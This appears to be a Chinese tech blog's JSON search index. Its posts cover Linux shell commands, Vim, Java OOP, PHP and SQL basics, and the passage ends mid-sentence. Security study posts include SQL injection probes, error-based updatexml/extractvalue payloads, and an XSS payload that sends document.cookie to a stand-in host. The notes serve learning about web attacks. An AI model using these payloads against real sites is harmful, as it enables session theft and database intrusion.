[{"title":"GNU基础shell命令（一）","url":"/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/","content":"在这里展示是Linux shell命令最基础的部分(Bash Shell)，却也是最重要的部分。（干货满满）\ncd命令cd-切换用户当前工作目录\n[-L|[-P [-e]]] [dir]``` **空格非常重要**&gt; 选项：&gt;&gt; -L （默认值）如果要切换到的目标目录是一个符号连接，那么切换到符号连接的目录。&gt;&gt; -P 如果要切换到的目标目录是一个符号连接，那么切换到它指向的物理位置目录。 &gt;&gt; -当前工作目录将被切换到环境变量OLDPWD所表示的目录，也就是前一个工作目录。 cd    # 进入用户主目录； cd /  # 进入根目录 cd ~  # 进入用户主目录； cd ..  # 返回上级目录（若当前目录为“/“，则执行完后还在“/&quot;；&quot;..&quot;为上级目录的意思）； cd ../..  # 返回上两级目录； *cd !$  # 把上个命令的参数作为cd参数使用。* **pwd-输入当前的目录** **绝对路径和相对路径**我们知道所谓路径就是用来定位目标的位置的。所以我们生活中的地址就是个活生生的例子比如我是杭电的一个学生用绝对路径怎么表示呢？**/银河系/太阳系/地球/亚洲/中国/浙江/杭州/江干区/下沙/杭电**（是不是很蠢）蠢就对了在Linux绝对路径就是这样用的:```shellcd /home/jacen/Downloads/\n\n\n\n\n\n同样用相对路径是什么说法呢？\n假如我的一个同学在江苏，那么我会告诉他我的地址是 /浙江/杭州/江干区/下沙/杭电 很合理（不是吗）同样我们在Linux中这样用:\ncd Downloads/doc/\n\n\n\n\n\n\n\nls命令ls命令 用来显示目标列表，在Linux中是使用率较高的命令\nls       # 仅列出当前目录可见文件\nls -l    # 列出当前目录可见文件详细信息 \nls -a   #列出当前目录的所有文件包括隐藏文件 （隐藏文件名前带点.）\nls -hl   # 列出详细信息并以可读大小显示文件大小 \nls -al   # 列出所有文件（包括隐藏）的详细信息 （缩写为ll）\ndu -sh * | sort -h # 按文件大小排序(同上)\nls -F    #每个目录名加 “/“ 后缀，每个 FIFO 名加 “|” 后缀， 每个可运行名加“ * ”后缀。\nls -R    #递归列出遇到的子目录\nls -FR \n\n\n过滤文件扩展匹配符 ? *\n?一个占位符\n*多个占位符\n元字符通配符 [] \ntouch命令*touch的作用是创建新文件或是更新时间* ** \n-a：或–time=atime或–time=access或–time=use  只更改存取时间；\n-c：或–no-create  不建立任何文件；\n-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；\n -f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；\n-m：或–time=mtime或–time=modify  只更该变动时间；\n-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；\n-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；\n–help：在线帮助； –version：显示版本信息。 \ncp命令cp-将源文件或目录复制到目标文件或目录中 \n-a：此参数的效果和同时指定”-dpR”参数相同； \n-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录； \n-f：强行复制文件或目录，不论目标文件或目录是否已存在； \n-i：覆盖既有文件之前先询问用户； \n-l：对源文件建立硬连接，而非复制文件； \n-p：保留源文件或目录的属性； \n-R/r：递归处理，将指定目录下的所有文件与子目录一并处理； \n-s：对源文件建立符号连接，而非复制文件； \n-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件； \n-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀； \n-b：覆盖已存在的文件目标前将目标文件备份； \n-v：详细显示命令执行的操作。 \n","categories":["Linux"]},{"title":"GNU基础shell命令（二）","url":"/2021/02/19/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BA%8C%EF%BC%89/","content":"ln命令链接文件\n\n符号链接（软链接）——快捷方式\nln -s (文件)（链接名）\n\n硬链接(只能在一个硬盘里)\nln (文件)（链接名） \n\n\nmv命令**mv命令-**用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。\n重命名\nmv (原名) (重命名)\n移动\n将目录/usr/men中的所有文件移到当前目录（用.表示）中：\nmv /usr/men/* . \n移动文件 :\nmv file_1.txt /home/office/ \n移动多个文件 \nmv file_2.txt file_3.txt file_4.txt /home/office/\nmv *.txt /home/office/ \n移动目录\nmv ../doc/ ~\nrm命令rm-用于删除给定的文件和目录 \n-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；\n-f：强制删除文件或目录；\n-i：删除已有文件或目录之前先询问用户；\n-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；\n–preserve-root：不对根目录进行递归操作；\n-v：显示指令的详细执行过程；\nmkdir命令mkdir-用来创建目录\n在目录/fuck/kk下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问 \nmkdir -m 700 ./fuck/kk/test \n在目录/fuck/kk下建立目录kid并建立它的父目录father\nmkdir -p ./fuck/kk/father/kid\ncat,more,less命令 （查看文件）cat-查看文件\ncat (文件名)\ncat -A\ncat -n\n适用于比较短的文件\nmore-显示文件内容，每次只显示一屏\n\n按 Space 键：显示文本的下一屏内容。\n按 Enter 键：只显示文本的下一行内容。\n按斜线符|：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。\n按H键：显示帮助屏，该屏上有相关的帮助信息。\n按B键：显示上一屏内容。\n按Q键：退出more命令\n\nless-分屏上下翻页浏览文件内容 \n和more类似但是不常用\n","categories":["Linux"]},{"title":"JAVA中的static","url":"/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/","content":"静态域如果将域定义为static,那么每个类只有这样一个域。例如我们需要给每个雇员给定一个唯一的标识符：\nclass Employee &#123;    private static int nextId = 1;    private int id;&#125;\n\n这里给Employee类添加了一个实例域id和一个静态域nextId,这个静态域即使是没有对象存在，它也是存在的，因为它不属于如何对象，它属于类。\n静态常量public class Math &#123;\t...\tpublic static final double PI = 3.14159265358979323846;&#125;\n\n以上例子中PI就是一个静态常量,只有通过 Math.PI才能访问。在举一个奇特例子，我们经常使用的Sysem.out 的out其实也是静态常量。\npublic class System &#123;    ...    public static final out = ...;    ...&#125;\n\n静态方法静态方法是一种不能向对象实施操作的方法。它不能使用任何类的对象，换句话说没有隐式的参数。但是静态方法可以访问自类中的静态域。如：\npublic static int getNextId() &#123;    return nextId;&#125;\n\n我们可以通过类名调用这个方法：\nint n = Employee.getNextId(); \n静态方法的使用主要出现在一下两种情况：\n\n一个方法不需要访问对象状态，所需的参数都是显示参数提供的。\n一个方法只需访问类的静态域。\n\n其他private static我们先看一看public static，既然有了public，那么每个类的对象都可以对公有域的值经行修改。于是就到了我们所提到的private static,但是我们如何得到它的值呢？\nprivate static String Plot = &quot;JOJO&quot;;public static String getPlotInstance &#123;    return Plot;&#125;\n\n我们可以用一个get方法。\nSystem.out.println(Dogs.getPlotInstance);//这里的Dogs是一个类名。\n\n\n\nstatic单例模式直接上代码：\nclass Earth &#123;    private static Earth instance = new Earth();        private Earth &#123;&#125;        public static Earth getIntance() &#123;        return instance;    &#125;&#125;\n\n这段代码叼就叼在第二行的private Earth,这个private让你不能new。我们只能让你用getInstance()方法。\nEarth earthinstance = Earth.getIntance();\n\n所有你只能new唯一个例子，这种模式的高级叫法是：static单例模式。\n","categories":["JAVA"]},{"title":"Linux到底是什么","url":"/2021/02/13/Linux%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/","content":" \n\nLinux起源Linux全称GNU/Linux （这很重要），它是一种类UNIX的操作系统，其内核是由林纳斯·本纳第克特·托瓦兹（Linus Benedict Torvalds，1969年12月28日- ）写的。\n\n20世纪80年代，当时可供计算机选用的操作系统主要有Unix。但是它并不是面向我们这些普通人的，Unix主要的用户仅仅是那些大厂，大公司。但这时林纳斯站出来了，他在大学里仅仅花了一年的时间就开发出了Linux的内核，并使之开源。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统 。\nLinux的各种发行版Linux有上百种不同的发行版 。列如（Ubuntu, CenntOS, RedHat, Kail…）。就好像安卓有华为，小米， oppo, vivo。\n主流发行版\nDebian(其派生版本有Ubuntu, Linux Mint, Kail)\nFedore(其派生版本有RedHat, CentOS, Xange, Yellow Dog Linux)\nopenSUSE(其派生版本有SUSE Linux Enterprise )\n\nLinux的四大组成部分\nLinux Kernel 内核\nGNU工具 GNU（GNU’s Not Unix! ）\nGUI Desktop环境\nApplication 应用\n\nGUI和GNU-Linux的系统组成有关Linux的系统组成，请参阅下面的思维导图。\n\n\n\n\nLinux内核\n硬件设备 管理使用\n软件程序 (系统) -&gt; 操作软件\n系统内存\n文件管理（保存文件， 删除文件， 修改文件）\n\n文件系统简单的来讲文件系统就是文件读和写的标准。\n\nlinux支持的文件系统类型：ext, ext2, ext3, ext4, hpfs, isp9660, JFS…\n\n\nWindows支持的文件系统类型： FAT32, NTFS, exFAT\n\n不同类型的文件系统产生不同的效果 。\nGNUGNU组织Unix上具有的一些软件，Linux内核本身没有，所以GNU就模仿Unix，为Linux写了一些必要的软件。\nGNU核心coreutils\n它是供Linux使用的工具。它有三个组成。\n\n用来处理文件的工具\n用来操作文本的工具\n用来管理进程的工具\n\nshell\n它是提供给用户使用的软件： 用户拿它来使用电脑，并且与电脑交互。\nshell(命令行壳层)提供一个命令行界面(CLI); 而图形壳层提供一个图形用户界面(GUI)。\nbash shell 基础shell\n其他的shell: zsh, ash, korn,  tcsh\n","categories":["Linux"],"tags":["操作系统"]},{"title":"OOP多态","url":"/2021/04/03/OOP%E5%A4%9A%E6%80%81/","content":"OOP多态“is-a”规则（置换规则）我们举个例子吧。如果我们有一个类叫做动物。显然我们可以创建一个动物的对象。接着我们考虑动物是一个超类，它有一个子类叫做“狗”。逻辑上来讲狗是动物，但是动物不一定是狗。因此我们可以进行这样的操作：将狗的对象赋值给动物类的变量。\nAnmial dogs = new Dogs();\n\n因此在JAVA程序设计中对象变量是多态的。\n","categories":["JAVA"]},{"title":"OOP封装","url":"/2021/03/30/OOP%E5%B0%81%E8%A3%85/","content":"封装private int age;public void setAge(int age) &#123;    if(age &gt; 100 || age &lt; 0) &#123;        this.age = 0;    &#125;else &#123;        this.age = age;    &#125;public int getAge() &#123;    return this.age;&#125;\n\nget和set这就是OOP封装。OOP封装有很大的优点，此时的age是一个只读域，很好的保护了数据的安全，虽然可以用set来修改他的值，但是我们可以在set里设置判断是否合法的条件。\n好用的工具虽然OOP封装有很多优点，但是如果在开发过程中有很多需要封装的实例域，这就会极大地降低效率。在IDEA中我推荐使用lombok。\n首先我们需要安装lombpk插件。\n\n\n接着我们在maven库中下载我们所需的架包。\n\n\n","categories":["JAVA"]},{"title":"OOP继承","url":"/2021/03/31/OOP%E7%BB%A7%E6%89%BF/","content":"OOP继承简单来说继承就是一个抽象到具体，共性到特性，一般到特殊的过程。\n类，超类，子类首先我们得了解类，超类，子类这三者的区别。一般被继承的类叫做超类，也叫做父类或是基类。而继承的类叫做子类，派生类或是孩子类。而类这是一个大的概念就不多做解释了。\npublic class Dogs extends animal &#123;    //添加方法和域&#125;\n\n如上述代码这就是定义子类的方法。\n\n在C++中继承的符号是 :\n\n覆盖方法这也叫方法的重写。在IDEA中我们可以这样实现。\n\n\n接着选择override，然后选择你需要重写的方法。\n\n\n子类构造器public Manager (String name, double salaty, int year, int month, int day) &#123;    super(name, salary, year, month, day);    bonus = 0;&#125;\n\n\n\n因为子类Manager的构造器无法访问其父类的私有域，这里我们运用了super关键字调用了超类的构造器。并且使用super调用构造器的语句必须是子类构造器的第一条语句。这样子类终于可以实现真正的啃老了！！！\n\n总结：this有两个用途：1.引用隐式参数，2.调用该类的其他构造器。super有两个用途：1.调用超类的方法，2.调用超类的构造器。\n\n多层继承这是一个比较有意思的功能。想一想，有父亲和儿子，难道就不能有孙子吗？因此这个继承是可以嵌套的。\npublic class Animal &#123;&#125;;public class Dogs extends Animal &#123;&#125;;public class LauLaduo extends Dogs &#123;&#125;;\n\n但是JAVA是不支持多继承的(C++支持)，但是你可以用嵌套。\n","categories":["JAVA"]},{"title":"SQL注入分类","url":"/2021/07/14/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/","content":"注入漏洞分类常见的SQL注入类型主要包括：数字型和字符型。\n数字型注入当输入的参数为整型时，如果存在注入漏洞，则可认为是数字型注入，数字型注入是最简单的一种。\n测试步骤：\nHTTP://www.xxser.com/test.php?id=8&#x27;\n\n出现异常\nHTTP://www.xxser.com/test.php?id=8 and 1=1\n\n正常执行，结构相同\nHTTP://www.xxser.com/test.php?id=8 and 1=2\n\n正常执行，结果有差异\n如果以上三个步骤全部满足，则程序可能存在SQL注入\n字符型注入当输入参数为字符串时，称为字符型。\n字符型注入的关键是如何闭合SQL语句以及注释多余的代码。\n当查询内容为字符串时：\nselect * from table where usename = &#x27;admin&#x27;\n\n此时要想注入，就要：\nselect * from table where usename = &#x27;admin&#x27; and 1=1 -- &#x27;\n\n又比如updata语句：\nupdata Person set username=&#x27;username&#x27;,set password=&#x27;password&#x27; where id=1\n\n现在对该SQL 语句进行注入就需要闭合单引号\nupdata Person set username=&#x27;username&#x27;,set password=&#x27;&#x27;+(select @@version)+&#x27;&#x27; where id=1\n\n利用两次单引号注释完成了注入。\n\n数据库不同其连接符也不同，SQL Server连接符号为”+”,Oracle连接符为”||”,MySQL连接符为空格、\n\n","categories":["web"],"tags":["SQL注入"]},{"title":"XSS简介","url":"/2021/04/03/XSS%E7%AE%80%E4%BB%8B/","content":"XSS英文全称(Cross Site Script),为了和CSS进行区别，在安全领域叫做”XSS”。XSS根据效果的不同分成三类:反射型，储存型，DOM Based XSS。\n反射型XSS它只是简单地把用户输入的数据反射给服务器。实现方式是黑客诱导用户点击恶意链接。\n\n\n储存型XSS它把用户输入的数据储存在服务器，这种方法具有很强的稳定性。\n\n\nDOM Based XSS从效果上来说，这也是反射型的XSS。其实现方法是修改页面的DOM节点。\n\n\n","categories":["web"]},{"title":"Vim基础","url":"/2021/04/23/Vim%E5%9F%BA%E7%A1%80/","content":"简单介绍\nVim是从vi发展出来的一个文本编辑器。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和Emacs并列成为类Unix系统用户最喜欢的编辑器。\n\n四种模式\n\n\n普通模式（Esc）\n插入模式（i, a, o）\n命令模式（:）\n视图模式（v, V）\n\n使用移动取代普通的方向键或是鼠标，h 是左， j是下， k是上，l 是右。\n翻页翻整页： Ctrl + f即Pagedown, Ctrl + b即PageUp\n翻半页： Ctrl + d, Ctrl + u\n翻到最后一行：shift + g即直接输入大写G。\n翻到第一行：gg\n翻到指定的行：ng n为行号。\n不同方式编辑文本，跳跃单词编辑：\ni 光标位置前面插入\na光标位置后面插入\no直接下一行插入 \nx删除光标所在字符\ndd删除整个一行\nu撤销\ndw删除所在光标所在的单词\nb跳越单词首字母（往前跳跃）\ne跳跃单词最后\nw跳跃下一个单词的首字母\nshift + w,shift + b,shift + e大跳\nr替换一个\nR替换任意\n跳跃行首行尾shift + 6跳到行首\nshift + 4跳到行尾\n大括号跳跃函数段落&#123;&#125;\n复制剪切粘贴p粘贴\ny复制\ny + w复制这个单词\ny + $从当前复制到末尾\nVisual可视化模式视图模式的其他用法查找和替换基础配置"},{"title":"XSS进阶","url":"/2021/04/06/XSS%E8%BF%9B%E9%98%B6/","content":"XSS PayloadXSS Payload是指用以完成各种具体功能的脚本(主要Javascript)。\n例如Cookie劫持：\nvar img = document.CreateElement(&quot;img&quot;);img.src = &quot;http://www.XSS.com/log?&quot;+escape(document.cookie);document.body.appendChild(img);\n\n","categories":["web"]},{"title":"php基础知识","url":"/2021/07/11/php%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"基本语法PHP脚本以&lt;php?开头，以?&gt;结尾。\n&lt;php?    //代码?&gt;\n\nphp文件的默认扩展名是.php\n注释&lt;php?    // 单行注释    # 单行注释    /*    多    行    注    释    */?&gt;\n\nphp的大小写敏感所有用户定义的函数、类、关键词都对大小写不敏感。\n所有的变量都对大小写敏感。\n变量\n变量以$开头\n变量名以字母和下划线开头\n变量名不能以数字开头\n变量名只能包含字母、数字、下划线\n\n变量会在首次赋值时被创建。\n超全局变量\n$GLOBALS\n$_SERVER\n$_REQUEST\n$_POST\n$_GET\n$_FILES\n$_ENV\n$_COOKIE\n$_SESSION\n\n变量范围通常php变量只有一个单独的范围，这个单独的范围，还包括了include和require引入的文件。\n&lt;?php$a = 1;include &#x27;b.inc&#x27;;?&gt;\n\n但是在用户自定义的函数中，则不然。\n&lt;?php$a = 1;function Test()&#123;    echo $a;&#125;Test();?&gt;    \n\n这个脚本不会有任何输出。此时我们可以用global关键字。\n&lt;?php$a = 1;function Test()&#123;    global $a;    echo $a;&#125;Test();?&gt;\n\n还有一种方法是使用php自定义的$GLOBALS数组\n&lt;?php$a = 1;$b = 2;function Sum()&#123;\t$GLOBALS[&#x27;b&#x27;] = $GLOBALS[&#x27;a&#x27;] + $GLOBALS[&#x27;b&#x27;];&#125;Sum();echo $b;?&gt;\n\n静态变量它只在局部函数中存在，当程序执行离开此作用域时，其值不会丢失。\n可变变量有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置。\n&lt;?php$a = &#x27;hello&#x27;;?&gt;\n\n一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 hello 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。\n&lt;?php$$a = &#x27;world&#x27;;?&gt;\n\n这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：\n&lt;?phpecho &quot;$a $&#123;$a&#125;&quot;;?&gt;\n\n与以下语句输出完全相同的结果：\n&lt;?phpecho &quot;$a $hello&quot;;?&gt;\n\n\n\nPHP表单POST和GET的区别通过GET方法从表单发送的信息对任何人都是可见的，数据数量限制在2000个字符。用于发送非敏感的数据。\n通过POST方法从表单发送的信息对其他人是不可见发，数据数量也是无限制的。\n","categories":["后端"],"tags":["php"]},{"title":"SQL报错注入","url":"/2021/07/15/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","content":"xpath报错注入updatexml()\nupdatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。\n作用：改变文档中符合条件的节点的值\n语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据\nupdatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）\n例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误\n\nextractvalue()\n此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\nextractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）\nselect user,password from users where user_id=1 and (extractvalue(1,0x7e));\n由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。\n\n报错实战 updatexml() （基于dvwa平台)floor ()函数报错注入floor()floor函数的作用就是返回小于等于括号内该值的最大整数。\nround()rand()可以产生一个在0和1之间的随机数。可以看出，直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。\nfloor(rand(0)*2)函数floor函数的作用就是返回小于等于括号内该值的最大整数。rand()本身是返回01的随机数，但在后面*2就变成了返回02之间的随机数。配合上floor函数就可以产生确定的两个数，即0和1。并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。此处的myclass 表为含有四行数据的表。\n","categories":["web"],"tags":["web"]},{"title":"SQL_language","url":"/2021/07/14/SQL-language/","content":"数据库的分类关系型它可以砍成一个二位矩阵，通过行和列可以确定每一个数据，类似Excel。\n基于关系数据库的数据库软件有很多，目前主流的数据库主要有以下几类：\n\n\n商用数据库：Oracle，SQL Server，DB2等。\n开源数据库：MySQL，PostgreSQL等。\n桌面数据库：Microsoft Access等。\n嵌入式数据库 ：Sqlite等。\n\n\n非关系型(NOSQL)​        在非关系数据库中，数据的定义没有关系数据库中的限制，数据的定义可以非常灵活，在如今这个数据爆炸的时代，NoSQL非常适用于那些数据关系不复杂，并且对数据的规模和扩展性有需求的场景。\n\nMongodb, DynamoDB\n\nSQL(Structured Query Language)SQL语言定义以下几种操作数据库的功能：\n\n\nDDL(Data Definition Language)：允许用户定义数据（创建表、删除表、修改表）。\nDML(Data Manipulation Language)：添加、删除、更新数据。\nDQL(Data Query Language)：查询数据，也是最频繁的数据库日常操作。\n\n\n关系模型关系数据库是建立在关系模型上的，而关系模型本质上就是由多个存储数据的二维表组成的。表的每一行叫做记录（ Record），记录是一个逻辑意义上的数据。表的每一列称为字段（Column），同一张表中每一列的数据类型都是一致的。字段包含的数据类型包括整形、浮点型、字符串、日期等等，以及是否允许为空（Null）。\n关系数据库的表和表之间的逻辑关系有三种：“一对多”、“多对一”和“一对一”。\n主键关系表中有个很重要的约束，就是任意两条记录不能重复。这里的不能重复指的是每条记录需要一个能和其他记录区别开来的特定字段，这个字段称为主键。\n常见的可作为id字段的类型有：\n\n\n自增整数类型：数据库会在插入数据后自动为每条记录分配一个自增整数，这样我们就不用担心主键重复，也不用自己预先生成主键。\n全局唯一GUID类型：这是一种全局唯一的字符串，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数生成在任意时间都不同的字符串，大部分编程语言内置了GUID算法，可以自动生成主键。\n\n\n联合主键关系数据库也允许表通过多个字段来定位记录，既使用两个或多个字段作为主键，这种主键叫做联合主键。对于联合主键，允许一列有重复，但是所有主键的组合必须是唯一的\n外键通过另一个表的主键联合两张表的字段就称之为外键。要注意的是，外键必须是另一个表格的主键。\n数据操作表格（创建，修改，删除）创建表CREATE TABLE是创建表格的语句。\nCREATE TABLE table_name (    column1 datatype1,    column2 datatype2,    column3 datatype3,   ....)\n\n例如：\nCREATE TABLE Students (    StudentID int,     Name varchar(255),    City varchar(255),    PRIMARY KEY(StudentID));\n\n特定数据库支持的数据类型不同，以下是常用的SQL数据类型：\n\n\n\n数据类型\n描述\n\n\n\nVARCHAR(n) 或 CHARACTER VARYING(n)\n可变长度的字符/字符串，最大长度为n\n\n\nBINARY(n)\n固定长度为n的二进制串\n\n\nBOOLEAN\n存储TRUE或FALSE值\n\n\nINTEGER(p)\n整数值（没有小数点），精度为p\n\n\nINTEGER\n整数值（没有小数点），精度为10\n\n\nDECIMAL(p, s)\n精确数值，精度为p，小数点后位数为s。例如：DICIMAL(5,2)小数点前有3位数，小数点后有2位数\n\n\nFLOAT(p)\n近似数值，尾数精度为p\n\n\nFLOAT\n近似数值，尾数精度为16\n\n\nDATE\n存储年、月、日的值\n\n\nTIMESTAMP\n存储年、月、日、小时、分、秒的值\n\n\n修改表如果我们想添加、删除、或者修改表中的特定字段，可以使用ALTER TABLE语句。添加字段语句如下：\nALTER TABLE table_name ADD column_name datatype;\n\n如果想要删除字段，使用ALTER TABLE table_name DROP COLUMN column_name;语句即可，以下语句就将Students中的Age字段删除了：\nALTER TABLE Students DROP COLUMN Age;\n\n修改字段设定的语句是：ALTER TABLE table_name MODIFY COLUMN column_name data_type; 以下语句将Students中Name的数据类型改为varchar(200)：\nALTER TABLE Students MODIFY COLUMN Name varchar(200);\n\n删除表如果要删除表格，使用DROP TABLE语句即可：DROP TABLE table_name；\nDROP TABLE Students;\n\n\n\n操作记录（增加，删除，修改，替换）关系数据库的基本操作是增删差改，既CRUD：Create, Retrieve, Update, Delete。\n插入记录INSERT INTO 语句用于在表中插入新记录，插入的方法有两张，第一种语法如下：\nINSERT INTO table_name(column1, column2, column3, ...) VALUES (value1, value2, value3, ...);\n\n第二种方法不需要指定column，只需要插入数据，但是要保证数据的顺序和数量和字段是对应的：\nINSERT INTO table_name VALUES (value1, value2, value3, ...);\n\n修改记录UPDATE 语句可以用来修改表中的记录，语法如下：\nUPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition;\n\n其中WHERE限定了你要更新的记录，关于condtion的内容会在之后学习查询时详细探讨，现在简单理解就好。如果不使用WHERE子句，那么所有的记录都会被更新。以下语句将StudentID为1的学生改名为‘Daniel’：\nUPDATE StudentsSET Name = &#x27;Daniel&#x27; WHERE StudentID = 1;\n\n删除记录如果要删除已有的记录，我们可以使用DELETE语句：\nDELETE FROM table WHERE condition;\n\n替换替换的意思就是：如果我们希望插入一条新纪录，但是如果此记录已经存在，就先删除原记录，再插入新纪录。此时，我们就能使用REPLACE语句，这样就不需要通过查询，再决定是否先删除再插入了：\nREPLACE INTO Students(StudentID, name, city) VALUES (1, &#x27;Enoch&#x27;, &#x27;New York City&#x27;);\n\n此语句的作用就是查询id为1的学生记录是否存在，如果不存在，就创建一个新的记录，否则，已有记录会被删除，然后新纪录再被插入。\n约束SQL约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。约束可以在创建表时规定（通过CREATE TABLE语句），或者在创建表之后规定（通过ALTER TABLE语句）。\n创建约束 CREATE TABLE创建表时规定约束的语句如下：\nCREATE TABLE table_name (    column1 data_type1(size) constraint1,    column2 data_type2(size) constraint2,    column3 data_type3(size) constraint3,    ...);\n\n其中 column 为字段名字，data_type 为数据类型，constraint 为约束类型，在SQL中，我们有以下约束：\n\n\nNOT NULL: 字段不能存储空值。\nUNIQUE: 保证字段的每行都是唯一的值。\nPRIMARY KEY: 主键，NOT NULL和UNIQUE的结合，确保某列（或多列）有唯一标识，用于找到特定记录。\nFOREIGN KEY：保证表中的数据匹配到（指向）另一个表中的主键。\nCHECK: 保证字段的值符合指定条件。\nDEFAULT: 规定没赋值时的默认值。\n\n\n创建约束 ALTER TABLE另一种添加约束的方法便是使用ALTER TABLE语句：\nALTER TABLE Students MODIFY Age int NOT NULL;\n\n此语句设定了一个新的约束：Students的Age字段不能为空。\n以下语句添加了一个外键约束：\nALTER TABLE StudentsADD CONSTRAINT fk_class_idFOREIGN KEY (classID)REFERENCES Classes(id);\n\n如果要删除Students中classID的外键约束，我们可以使用以下的语句:\nALTER TABLE StudentsDROP FOREIGN KEY fk_class_id;\n\n基本查询语法基本查询如果想要查询表的数据，我们可以使用SELECT语句：\nSELECT * FROM table_name;\n\n条件查询使用SELECT * FROM table_name可以查到一张表的所有记录，但有时我们只需要获取符合特定条件的记录，那么我们就可以添加WHERE语句，来限定查询记录的条件：\nSELECT * FROM table_name WHERE condition;\n\n条件表达式条件表达式（condition）有很多种，如果我们需要满足多个条件，可以使用 AND 连接多个条件。如果我们希望同时满足两个条件，那么我们需要在WHERE后面加上condtion1 AND condition2。还有一种条件是 NOT condition，代表不符合某种条件，比如我们要选取 Gender 为 ‘M’ 的学生，另一种写法就是 Gender 不为 ‘F’ 即可。\nSELECT * FROM Students WHERE NOT Gender = &#x27;F&#x27;;\n\n上面 NOT Gender = ‘F’ 等价于 Gender &lt;&gt; ‘F’，所以两种写法都可以。如果要组合三个或更多的条件，那么就需要用圆括号()限制条件的判断顺序。比如我们需要查找Age在20以下或22以上，并且是男生的学生，可以使用以下语句：\nSELECT * FROM Students WHERE (Age &lt; 20 OR Age &gt; 22) AND Gender = &#x27;M&#x27;;\n\n如果不加括号，条件运算则会按照 NOT, AND, OR 的优先级顺序执行，既NOT优先级最高，最低的是OR。以下是常见条件表达式的总结：\n\n\n\n条件\n说明\nExample1\nExample2\n\n\n\n=\n判断相等\nage = 20\nname = ‘xyz’\n\n\n&gt;\n判断大于\nage &gt; 20\nname &gt; ‘xyz’\n\n\n&gt;=\n判断大于等于\nage &gt;= 20\nname &gt;= ‘xyz’\n\n\n&lt;\n判断小于\nage &lt; 20\nname &lt; ‘xyz’\n\n\n&lt;=\n判断小于等于\nage &lt;= 20\nname &lt;= ‘xyz’\n\n\n&lt;&gt;\n判断不等于\nage &lt;&gt; 20\nname &lt;&gt; ‘xyz’\n\n\nLIKE\n判断相似\n\nname LIKE ‘xy%’（%表示任意字符，xy%表示以xy为开头的字符）\n\n\n投影查询使用SELECT * FROM table_name WHERE condition可以选出表中的若干条记录，所返回的记录字段和原表是相同的，即结果的所有字段与原表的所有字段都一一对应。如果我们只希望返回某些特定字段的数据，而不是所有字段的数据，我们可以用 SELECT column1, column2, … FROM table_name; 让结果集仅包含指定字段。这种操作称为投影查询。\n如果我们只想要不同的数据，可以使用SELECT DISTINCT，语法如下：\nSELECT DISTINCT column1, column2, ... FROM table_name;\n\n如果我们只想知道学生来自哪些不同的城市，可以使用以下语句：\nSELECT DISTINCT City FROM Students;\n\n排序ORDER BY当我们使用SELECT查询的时候，查询的结果往往是根据主键排序的，在我们的例子中就是按照StudentID排序的。如果我们想要根据我们自定义的字段排序的话，我们可以在最后加上ORDER BY，以下是ORDER BY的语法：\nSELECT col1, col2, ... FROM table_nameORDER BY col1, col2, ... ASC|DESC;\n\n例如，我们希望学生按照年龄从小到大排好序，那么就可以使用以下语句：\nSELECT * FROM Students ORDER BY Age;\n\n如果我们不在ORDE BY最后加上 ASC 或 DESC，那么就是默认从小到大排好序的。其中 ASC 表示从小到大的顺序，DESC表示倒序，以下语句获得的学生则会根据年龄从大到小排好序：w\nSELECT * FROM Students ORDER BY Age DESC;\n\n如果我们希望结果按照年纪从小到大排好序后，再根据性别排序的话，可以使用以下语句：\nSELECT * FROM Students ORDER BY Age ASC, Gender;\n\n如果有WHERE子句，那么ORDER BY需要放在WHERE后面，如下：\nSELECT * FROM Students WHERE City = &#x27;Shanghai&#x27;ORDER BY 